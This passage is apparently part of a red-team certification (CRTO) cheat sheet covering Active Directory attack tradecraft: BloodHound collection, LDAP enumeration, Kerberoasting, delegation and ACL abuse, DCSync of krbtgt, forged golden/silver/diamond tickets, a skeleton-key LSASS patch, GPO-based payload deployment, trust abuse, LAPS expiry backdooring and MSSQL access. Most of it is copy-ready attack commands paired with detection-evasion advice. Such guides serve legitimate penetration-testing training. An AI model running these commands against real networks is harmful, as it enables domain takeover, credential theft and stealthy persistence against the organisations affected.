execute-assembly C:\Tools\SharpHound\SharpHound.exe -c All -d <domain> --ldapusername <user> --ldappassword <pass> --zipfilename loot.zip
```

**Collection methods and their cost**

| Method | What it does | OPSEC |
|---|---|---|
| `DCOnly` | LDAP from a DC only | 🟢 quietest; no host sessions |
| `Group` / `ACL` / `ObjectProps` | LDAP | 🟢 |
| `LocalAdmin` | Reads local admin groups on hosts | Medium; touches every computer |
| `Session` | Reads sessions/logged-on users | 🔊 SMB to every host |
| `All` | Everything | 🔊 loudest |
| `--stealth` | Avoids session collection, randomises | 🟢 good default |
| `--excludedcs` | Skips DCs | 🟢 avoids Tier-0 noise |

**Import:** open BloodHound, upload the `.zip` in the GUI. Do not run SharpHound from a restricted host; run it from a Tier-2 foothold.

### 11.3 BloodHound: what to look for

Start with the built-in queries, then use Cypher for the specific path.

| Question | Built-in query / Cypher |
|---|---|
| How do I reach Domain Admin? | *Shortest Paths to Domain Admins* |
| Who can Kerberoast? | *Find all Kerberoastable Users* |
| Who has no pre-auth? | *Find all AS-REP roastable Users* |
| Who can DCSync? | *Find principals with DCSync rights* |
| Where are Domain Users local admin? | *Find Computers where Domain Users are Local Admin* |
| Unconstrained delegation? | *Find Computers with Unconstrained Delegation* |
| Constrained delegation? | *Find Constrained Delegation Users/Computers* |
| Dangerous ACLs? | *Find Dangerous Rights for Domain Users* |
| GPO control? | *Shortest Paths to High Value Targets* |

```cypher
// Shortest path from an owned user to Domain Admins
MATCH p=shortestPath((u:User {name:"ALICE@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// All Kerberoastable users with admin rights
MATCH (u:User {hasspn:true})-[r:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "ADMIN"
RETURN u.name, g.name

// Computers where Domain Users are local admin
MATCH p=(g:Group {name:"DOMAIN USERS@CORP.LOCAL"})-[r:AdminTo]->(c:Computer)
RETURN c.name

// Users with DCSync rights
MATCH p=(u:User)-[:DCSync|:GenericAll|:WriteDacl]->(d:Domain)
RETURN p
```

**Reading the graph:** edges are actions. `MemberOf` is not an attack; `GenericAll`, `WriteDacl`, `ForceChangePassword`, `AddMember`, `AllowedToDelegate`, `AdminTo`, `CanRDP`, `ExecuteDCOM`, `HasSession` are. A path of two ACL edges is often easier than a Kerberoast.

### 11.4 Native and ADSearch

```text
# ADSearch — flexible LDAP queries
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)" --attributes "sAMAccountName,servicePrincipalName,userAccountControl"
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain <domain> --attributes distinguishedName,name,flatName,trustDirection

# Native
dsquery user -limit 0
dsquery group -limit 0
dsquery computer -limit 0
net group "Domain Admins" /domain
nltest /domain_trusts /all_trusts
setspn -T <domain> -Q */*
```

### 11.5 ldapsearch BOF and BofHound

`ldapsearch` runs LDAP from Beacon without loading PowerView or dropping SharpHound on a host, prints results as text, and that text can be parsed offline into BloodHound JSON with **BofHound**. It is the quietest way to get directory objects, and the only way to get a graph from a host where you cannot run a collector at all.

```text
ldapsearch "<filter>" --attributes <attr1,attr2>
ldapsearch "<filter>" --attributes *,ntsecuritydescriptor     # ACL data for BofHound
ldapsearch --base "<DN>" --scope base "<filter>" --attributes *
```

**Quote the filter.** Bare `&` and parentheses get mangled by the command parser.

**Bit flags need a matching rule.** `userAccountControl` packs every flag into one number, so you test a bit instead of comparing the whole value:

```text
userAccountControl:1.2.840.113556.1.4.803:=524288
                    └── LDAP_MATCHING_RULE_BIT_AND ──┘
```

`1.2.840.113556.1.4.803` is fixed and always means "bitwise AND, match if non-zero". The number after it is the flag under test. `:=` is required — `=` compares the entire value and will not match a partial bit.

| Decimal | Hex | Flag |
|---|---|---|
| 2 | `0x2` | ACCOUNTDISABLE |
| 32 | `0x20` | PASSWD_NOTREQD |
| 4096 | `0x1000` | WORKSTATION_TRUST_ACCOUNT |
| 8192 | `0x2000` | SERVER_TRUST_ACCOUNT (DC) |
| 65536 | `0x10000` | DONT_EXPIRE_PASSWORD |
| 524288 | `0x80000` | TRUSTED_FOR_DELEGATION |
| 1048576 | `0x100000` | NOT_DELEGATED (sensitive) |
| 4194304 | `0x400000` | DONT_REQUIRE_PREAUTH |
| 16777216 | `0x1000000` | TRUSTED_TO_AUTH_FOR_DELEGATION |

Other matching rules: `1.2.840.113556.1.4.804` (BIT_OR), `1.2.840.113556.1.4.1941` (IN_CHAIN — recursive group membership).

**Collection — feed these to BofHound**

```text
ldapsearch "(|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))" --attributes *,ntsecuritydescriptor
ldapsearch "(|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456))" --attributes *,ntsecuritydescriptor
```

Domain, OUs, GPOs, users, computers, groups — the same object set a `DCOnly` SharpHound run produces. `--attributes *` does **not** include `nTSecurityDescriptor`; without it the graph has no ACL edges, which is where most of the attack paths live.

**Delegation**

```text
# constrained — who may act as a user, toward where
ldapsearch "(&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))" --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

# protocol transition (0x1000000)
ldapsearch "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" --attributes samAccountName

# unconstrained — excludes DCs, which carry the bit by default
ldapsearch "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" --attributes samAccountName,dNSHostName
ldapsearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samAccountName

# sensitive and cannot be delegated — explains a silent S4U2self failure
ldapsearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=1048576))" --attributes samAccountName

# RBCD — not constrained delegation; read the attribute name carefully
ldapsearch "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Roasting candidates**

```text
# Kerberoastable — enabled accounts only; check encryption types before requesting
ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes samAccountName,servicePrincipalName,msDS-SupportedEncryptionTypes,pwdLastSet

# AS-REP roastable
ldapsearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes samAccountName,pwdLastSet

# password never expires — weaker candidates, but cheap to check
ldapsearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes samAccountName,pwdLastSet
```

If `msDS-SupportedEncryptionTypes` rules out RC4, you get an AES ticket that will not crack in an exam window — decide that before you request, or use `/rc4opsec` / `/tgtdeleg` deliberately.

**Privilege and identity**

```text
# AdminSDHolder-protected accounts
ldapsearch "(&(samAccountType=805306368)(adminCount=1))" --attributes samAccountName,memberOf

# the privileged groups themselves
ldapsearch "(&(samAccountType=268435456)(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Schema Admins)(cn=Administrators)(cn=Account Operators)(cn=Backup Operators)(cn=Server Operators)(cn=Print Operators)(cn=DNSAdmins)))" --attributes cn,member

# transitive membership of one group (IN_CHAIN)
ldapsearch "(&(objectCategory=person)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=<domain>,DC=<tld>))" --attributes samAccountName

# SID history — cross-domain privilege that survives re-acl
ldapsearch "(sIDHistory=*)" --attributes samAccountName,sIDHistory,objectClass

# password not required
ldapsearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=32))" --attributes samAccountName
ldapsearch "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=32))" --attributes samAccountName
```

**Environment facts**

```text
# domain object — machine account quota (RBCD / machine accounts), functional level, ACLs
ldapsearch "(objectClass=domain)" --attributes name,objectSid,ms-DS-MachineAccountQuota,msDS-Behavior-Version,ntsecuritydescriptor

# domain controllers
ldapsearch "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" --attributes samAccountName,dNSHostName

# trusts
ldapsearch "(objectClass=trustedDomain)" --attributes name,trustDirection,trustAttributes,trustPartner

# LAPS (legacy and Windows LAPS 2023)
ldapsearch "(ms-Mcs-AdmPwd=*)" --attributes samAccountName,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
ldapsearch "(msLAPS-Password=*)" --attributes samAccountName,msLAPS-Password

# gMSA
ldapsearch "(objectClass=msDS-GroupManagedServiceAccount)" --attributes samAccountName,msDS-ManagedPasswordInterval

# descriptions — passwords get pasted here
ldapsearch "(&(objectClass=computer)(description=*))" --attributes samAccountName,description
```

**ADCS (if you reach it)**

```text
ldapsearch "(objectClass=pKIEnrollmentService)" --attributes cn,dNSHostName,certificateTemplates
ldapsearch "(objectClass=msPKI-Enterprise-Oid)" --attributes cn,msPKI-Cert-Template-OID,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage
```

**BofHound**

```text
# parse a directory of BOF logs into BloodHound JSON, then upload the output folder
bofhound -i logs/ -o bh-output
```

| Symptom | Cause | Fix |
|---|---|---|
| Graph has objects but no paths | No `nTSecurityDescriptor` | Re-query with `--attributes *,ntsecuritydescriptor` |
| LAPS or gMSA password is empty | You lack read rights | Test as a principal that should have them; empty does not mean absent |
| Every DC appears "unconstrained" | DCs carry the bit by default | Add `!...:=8192` |
| Fewer objects than expected | Truncated or partial log | Re-collect; compare BofHound's object count |
| BofHound graph looks thin | Directory-only by design | No sessions or local admin — those need host enumeration |

### 11.6 The high-value findings

Prioritise these over exhaustive enumeration:

| Finding | Why it matters | Where to look |
|---|---|---|
| Kerberoastable service account with admin rights | Crack → DA | `Get-DomainUser -SPN` + BloodHound |
| AS-REP roastable user | Crack → user access | `Get-DomainUser -PreauthNotRequired` |
| Unconstrained delegation host | Coerce a DC → TGT | `Get-DomainComputer -Unconstrained` |
| Constrained delegation with protocol transition | S4U → impersonate admin | `-TrustedToAuth` |
| RBCD write on a computer | S4U → admin on that host | BloodHound ACL edges |
| ACL: GenericAll / WriteDacl / ForceChangePassword | Direct escalation | `Find-InterestingDomainAcl` |
| DCSync rights | krbtgt → golden ticket | BloodHound |
| ADCS misconfiguration | Certificate → DA | Certify/Certipy (Section 13) |
| Local admin reuse | Lateral movement | `Find-LocalAdminAccess` (sparingly) |
| LAPS readable | Local admin passwords | LAPSToolkit (Section 12.8) |
| MSSQL sysadmin / links | Command execution, lateral | SQLRecon (Section 12.9) |

### 11.7 OPSEC for AD reconnaissance

- **LDAP is cheap; SMB sweeps are not.** Prefer `DCOnly` collection and targeted LDAP filters.
- **Avoid `Session` collection** unless you need it. It touches every computer.
- **Do not run SharpHound `All` from a DC or restricted host.**
- **LDAP logging:** if "Directory Service Access" auditing is on, searches can be logged (1644). Volume and unusual filters matter.
- **`setspn -T` and `dsquery` are normal admin activity**; a burst of `Find-LocalAdminAccess` from a user workstation is not.
- **Tier your queries:** run the loud ones from Tier 2, then move only the results.

### 11.8 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| BloodHound import fails | Corrupt/partial zip | Re-collect; check file size |
| SharpHound returns no sessions | No admin / SMB blocked | Use `DCOnly`; collect from a host with access |
| `Get-Domain` returns nothing | Not domain-joined, or DNS wrong | `nltest /dsgetdc`; set DNS to DC |
| PowerView blocked by AMSI | Script contains signatures | Use SharpView / `execute-assembly` equivalents |
| ACL query slow | Large domain | Filter by object; use BloodHound |
| BloodHound shows no path | Stale data | Re-collect after changes |

## 12. Kerberos and domain escalation

Kerberos attacks are the core of CRTO. Most of them are a trade: a small, specific directory interaction in exchange for a credential or ticket that unlocks the domain.

### 12.1 Kerberos in 60 seconds

| Step | Exchange | What it proves |
|---|---|---|
| 1 | **AS-REQ / AS-REP** | User proves identity (password/key) → gets a **TGT** encrypted with `krbtgt` |
| 2 | **TGS-REQ / TGS-REP** | User presents TGT → gets a **service ticket (TGS)** encrypted with the service account's key |
| 3 | Service use | Service decrypts the TGS with its own key → trusts the identity inside |

**Consequences you exploit:**
- A service ticket is encrypted with the **service account's** key. Ask for one, crack it offline. → *Kerberoasting*.
- An AS-REP for an account with pre-auth disabled is encrypted with the **user's** key. Ask, crack offline. → *AS-REP roasting*.
- If you have `krbtgt`'s key, you can forge **any** TGT. → *Golden ticket*.
- If you have a service account's key, you can forge a TGS for that service. → *Silver ticket*.
- Delegation lets a service request tickets **on behalf of** users. → *S4U abuse*.

**Encryption types:** RC4-HMAC = `0x17` (uses the NT hash), AES128 = `0x11`, AES256 = `0x12`. RC4 requests are the noisy, well-signatured kind; prefer AES.

### 12.2 Kerberoasting

Any authenticated domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's key — crack it offline.

```text
# Find roastable accounts
powerpick Get-DomainUser -SPN | select cn,samaccountname,serviceprincipalname
powerpick Get-DomainUser | select cn,serviceprincipalname | ? { $_.serviceprincipalname -ne $null }

# Request tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:<user> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:<user1>,<user2> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /rc4opsec /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
```

```bash
# Operator side
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule
```

**OPSEC:**
- Each request is **4769**; RC4 tickets (`0x17`) on an AES-capable domain are anomalous.
- `/rc4opsec` reduces noisy/failed requests; use it.
- **Do not roast every SPN.** Target accounts with admin rights or privileged group membership (BloodHound tells you which).
- Do not request more than a handful in a burst; space them out.
- Cracking is offline and invisible.

### 12.3 AS-REP roasting

Accounts with `DONT_REQ_PREAUTH` return an AS-REP encrypted with the user's key without proving identity.

```text
powerpick Get-DomainUser -PreauthNotRequired | select cn,samaccountname

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:<user> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

```bash
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc> -request -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

**OPSEC:** 4768 with pre-auth disabled; low volume, low noise. The ticket is requested without credentials, so it is a lower-risk roast than Kerberoasting.

### 12.4 Delegation

#### Unconstrained delegation

A host trusted for **unconstrained delegation** caches the TGT of anyone who authenticates to it. Coerce a privileged user (or a DC) to authenticate, then extract the TGT.

```text
# Find hosts
powerpick Get-DomainComputer -Unconstrained | select cn,dnshostname
powerpick Get-DomainUser -Properties cn,samaccountname,useraccountcontrol | ? { $_.useraccountcontrol -band 0x80000 } | select cn,samaccountname

# On the delegation host, watch for incoming tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

# Coerce authentication (PrinterBug / PetitPotam) — from another host/context
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /target:<dc-fqdn>
# or SpoolSample.exe <dc> <delegation-host>
# or PetitPotam.exe <dc> <delegation-host>

# Use the captured TGT
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
```

**OPSEC:** coercion (PrinterBug/PetitPotam) is high-signal and often patched; `tgtdeleg` is a local abuse of the delegation host. Monitoring produces Rubeus signatures. Do not run this on a restricted host.

#### Constrained delegation

An account with `msDS-AllowedToDelegateTo` can request tickets to specific services. With protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`), it can impersonate any user via S4U2Self + S4U2Proxy.

```text
# Find
powerpick Get-DomainUser -TrustedToAuth | select cn,samaccountname,msds-allowedtodelegateto
powerpick Get-DomainComputer -TrustedToAuth | select cn,dnshostname,msds-allowedtodelegateto
powerpick Get-DomainObject -Identity <account> -Properties msDS-AllowedToDelegateTo,userAccountControl

# S4U2Self + S4U2Proxy (need the account's key/hash/password)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:<svc-account> /rc4:<hash> /impersonateuser:<admin> /msdsspn:<spn> /altservice:<service> /domain:<domain> /dc:<dc> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:<svc-account> /aes256:<key> /impersonateuser:<admin> /msdsspn:<spn> /altservice:<service> /domain:<domain> /dc:<dc> /nowrap

# Use the resulting TGS
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
```

**OPSEC:** S4U requests are 4769 with the impersonated user as the target; unusual combinations stand out. Use the narrowest `msdsspn` and only the service you need.

#### Resource-Based Constrained Delegation (RBCD)

If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer (ACL abuse, or a machine account you control with `MachineAccountQuota > 0`), you can make that computer trust your controlled account, then S4U to it.

```text
# 1. Check MachineAccountQuota
powerpick Get-DomainObject -Identity "DC=<domain>,DC=<tld>" -Properties ms-DS-MachineAccountQuota

# 2. Create a controlled computer account
execute-assembly C:\Tools\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make --Domain <domain>

# 3. Write the RBCD attribute on the target (requires the right ACL)
#    Generic approach with the AD module ⚠:
powerpick Set-ADComputer -Identity <target-host> -PrincipalsAllowedToDelegateToAccount EvilComputer$
#    Or set msDS-AllowedToActOnBehalfOfOtherIdentity directly ⚠

# 4. Get a TGT for the controlled computer
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:<pass> /user:EvilComputer$ /domain:<domain>
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:<key> /domain:<domain> /nowrap

# 5. S4U to the target service
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /aes256:<key> /impersonateuser:<admin> /msdsspn:cifs/<target-fqdn> /domain:<domain> /dc:<dc> /nowrap

# 6. Use the ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
ls \\<target-fqdn>\c$
```

**OPSEC:** writing the RBCD attribute is **5136** and is high-signal. Remove `msDS-AllowedToActOnBehalfOfOtherIdentity` and the controlled computer account when done. Machine-account creation is also logged.

#### Shadow credentials

If you can write `msDS-KeyCredentialLink` on a user or computer, you can add a key credential and authenticate as that principal with a certificate.

```bash
# Linux / operator side
certipy shadow auto -u <user>@<domain> -p <pass> -account <target> -dc-ip <dc>

# Windows
# Whisker add /target:<target> /domain:<domain> /dc:<dc>
# then Rubeus asktgt /user:<target> /certificate:<base64> /password:<pass> /enctype:aes256 /nowrap
```

**OPSEC:** 5136 (KeyCredentialLink). Remove the added key credential after use.

### 12.5 ACL abuse

ACLs are the most common "quiet" path to Domain Admin. Enumerate, then use the specific right.

```text
powerpick Find-InterestingDomainAcl -ResolveGUIDs
powerpick Get-ObjectAcl -Identity <target> -ResolveGUIDs
powerpick Invoke-ACLScanner -ResolveGUIDs

# ForceChangePassword
powerpick Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose

# AddMember
powerpick Add-DomainGroupMember -Identity "Domain Admins" -Members <user> -Verbose

# WriteDACL — grant yourself DCSync
powerpick Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<tld>" -PrincipalIdentity <user> -Rights DCSync

# WriteDACL — grant all
powerpick Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights All

# WriteOwner
powerpick Set-DomainObjectOwner -Identity <target> -OwnerIdentity <user>

# GenericWrite/GenericAll on a user: targeted Kerberoast
powerpick Set-DomainObject -Identity <user> -Set @{serviceprincipalname='nonexistent/foo'}

# GenericAll on a computer: RBCD (Section 12.4)
```

| Right | Effect | OPSEC |
|---|---|---|
| `ForceChangePassword` | Reset password | 4724; noisy but direct |
| `GenericAll` (user) | Set SPN or password | 5136 |
| `GenericAll` (computer) | RBCD | 5136 |
| `AddMember` | Add to group | 4728/4732/4756 |
| `WriteDacl` | Grant yourself rights | 5136 |
| `WriteOwner` | Take ownership | 5136 |
| `AllExtendedRights` | Password reset / DCSync | Varies |

**OPSEC:** every ACL write is 5136 and very visible. Use the narrowest right, revert it, and do not chain ACL writes on a Tier-0 object unless the objective requires it.

### 12.6 DCSync

DCSync abuses directory replication rights to pull password data from a DC as if you were another DC.

```text
# Cobalt Strike
dcsync <domain> <DOMAIN\user>
dcsync <domain> krbtgt

# Mimikatz
mimikatz !lsadump::dcsync /domain:<domain> /user:krbtgt
mimikatz !lsadump::dcsync /domain:<domain> /all

# Operator side
secretsdump.py <domain>/<user>:<pass>@<dc> -just-dc-user krbtgt
secretsdump.py <domain>/<user>@<dc> -hashes :<ntlm>
```

**What to pull:** `krbtgt` (golden), machine accounts, service accounts, and any user whose hash unlocks a path. `-all` is loud and unnecessary.

**OPSEC:** **4662** with the replication GUIDs (`DS-Replication-Get-Changes`, `...-All`) is the DCSync signature. Do it from a non-DC host, once, and do not repeat. If you only need one account, ask for one.

### 12.7 Golden, silver, and diamond tickets

#### Golden ticket

Requires: `krbtgt` AES256/NTLM key + domain SID.

```text
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<krbtgt-aes256> /user:<user> /domain:<domain> /sid:<domain-sid> /nowrap

# With extra SIDs (child → parent, Section 12.10)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<krbtgt-aes256> /user:Administrator /domain:<child> /sid:<child-sid> /sids:<parent-enterprise-admins-sid> /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
```

```text
# Mimikatz equivalent
mimikatz kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash-or-aes> /ptt
```

**OPSEC:** a forged TGT has no corresponding 4768, may have an unusual lifetime, and often uses RC4. Prefer AES. Prefer **diamond** if you have a real TGT to modify.

#### Silver ticket

Requires: service account key/hash + domain SID + the service SPN. Forges a **TGS**; no DC interaction.

```text
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/<host-fqdn> /aes256:<service-aes256> /user:<user> /domain:<domain> /sid:<domain-sid> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
ls \\<host-fqdn>\c$
```

```text
mimikatz kerberos::golden /service:cifs /target:<host-fqdn> /rc4:<service-ntlm> /sid:<sid> /user:<user> /ptt
```

**OPSEC:** the DC sees no 4769; the **service** sees a logon. A silver ticket scoped to one service is quieter than a golden ticket, but the service logs may still flag it.

#### Diamond ticket

Modifies a legitimate TGT (obtained with `/tgtdeleg`) using the `krbtgt` AES key, so the ticket looks more like a real one than a golden ticket.

```text
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:<gid> /krbkey:<krbtgt-aes256> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:<extra-sid> /krbkey:<krbtgt-aes256> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:<base64>
```

**OPSEC:** still anomalous (group/SID changes, lifetime), but public guidance favours diamond over golden. Use targeted SIDs, not `-519` everywhere.

### 12.8 Skeleton key

Patches the DC's LSASS so any account accepts a master password.

```text
# On the DC, as SYSTEM
mimikatz !privilege::debug
mimikatz !misc::skeleton

# Then authenticate as anyone with the master password
net use \\<dc>\c$ /user:<domain>\Administrator mimikatz
```

**OPSEC:** patches LSASS on a DC, is highly detectable, does not survive reboot, and is generally a last resort. Avoid on a graded exam unless the objective explicitly requires it.

### 12.9 GPO abuse

If you can create/link/edit GPOs, you can push a payload or configuration to every computer in an OU.

```text
powerpick New-GPO -Name "Evil GPO"
powerpick Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=<domain>,DC=<tld>"

powerpick Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create `
  -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" `
  -Value "C:\Windows\System32\cmd.exe /c \\<server>\share\payload.exe" -Type ExpandString

# Force update on a target
powerpick Invoke-GPUpdate -Computer <host> -Force
```

```text
# SharpGPOAbuse (if available) — add an immediate scheduled task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c \\<server>\share\payload.exe" --GPOName "Evil GPO"
```

**OPSEC:** GPO changes are 5136 plus SYSVOL file writes and replicate to every affected host. Very loud. Revert the GPO and links afterward.

### 12.10 Trusts

```text
powerpick Get-DomainTrust
powerpick Get-ForestTrust
powerpick Get-DomainTrust -Domain <other-domain>
nltest /domain_trusts /all_trusts
```

#### Child → parent (extra SIDs)

A child-domain admin can forge a golden ticket with the parent's **Enterprise Admins** SID in the SID history.

```text
# Get the parent Enterprise Admins SID
powerpick Get-DomainGroup -Identity "Enterprise Admins" -Domain <parent> -Properties ObjectSid
powerpick Get-DomainSID -Domain <parent>

# Forge with /sids
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<child-krbtgt-aes> /user:Administrator /domain:<child> /sid:<child-sid> /sids:<parent-enterprise-admins-sid> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
```

**OPSEC:** SID filtering may block this in some trusts; test. Extra SIDs are anomalous.

#### Inbound trust (foreign principals in your domain)

```text
powerpick Get-DomainForeignGroupMember -Domain <trusted-domain>
powerpick Find-ForeignGroup -Domain <trusted-domain>
powerpick Find-ForeignUser -Domain <trusted-domain>
powerpick ConvertFrom-SID <foreign-sid>
```

Get credentials for the foreign principal (DCSync if you have rights in that domain), request a TGT, then a cross-domain TGS:

```text
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<foreign-user> /domain:<foreign-domain> /aes256:<key> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/<trusting-domain> /domain:<foreign-domain> /dc:<foreign-dc> /nowrap /ticket:<tgt>
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/<target-fqdn> /domain:<trusting-domain> /dc:<trusting-dc> /nowrap /ticket:<tgt>
```

#### Outbound trust (your domain trusts another)

```text
# Dump the trust key (noisy)
mimikatz lsadump::trust /patch

# Get the trust object GUID and DCSync it
powerpick Get-DomainObject -Identity "CN=<other-domain>,CN=System,DC=<domain>,DC=<tld>" | select objectGuid
mimikatz @lsadump::dcsync /domain:<domain> /guid:{<guid>}

# Request a TGT as the trust account and pivot into the trusted domain
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<TRUST>$ /domain:<domain> /rc4:<trust-key> /nowrap
```

**OPSEC:** `lsadump::trust /patch` is explicitly *not* OPSEC-safe (it patches LSASS). Prefer DCSync of the trust object. Cross-domain tickets are anomalous; scope them narrowly.

### 12.11 LAPS

LAPS stores local admin passwords in `ms-Mcs-AdmPwd`, readable by delegated principals.

```text
powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwd" -ne $null } | select dnsHostName
powerpick Get-DomainComputer -Identity <host> -Properties ms-Mcs-AdmPwd

# Find who can read it
powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
powerpick Find-LAPSDelegatedGroups
powerpick Find-AdmPwdExtendedRights

# Use the password
make_token .\<local-admin> <password>
ls \\<host>\c$

# Backdoor the expiry (extend password lifetime) ⚠
powerpick Set-DomainObject -Identity <host> -Set @{'ms-Mcs-AdmPwdExpirationTime'='136257686710000000'} -Verbose
```

**OPSEC:** reading `ms-Mcs-AdmPwd` is 4662 and may be audited. Extending expiry requires `PwdExpirationProtectionEnabled` to be off; it is a durable change — revert if you make it.

### 12.12 MSSQL

SQL servers are common lateral-movement and privilege-escalation targets.

```text
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
powerpick Get-SQLInstanceDomain
powerpick Get-SQLInstanceBroadcast
powerpick Get-SQLConnectionTest -Instance <sql-host> | fl
powerpick Get-SQLServerInfo -Instance <sql-host>
powerpick Get-SQLQuery -Instance <sql-host> -Query "select @@servername"

# SQLRecon
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:info
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:whoami
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:query /c:"select @@version"
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:impersonate
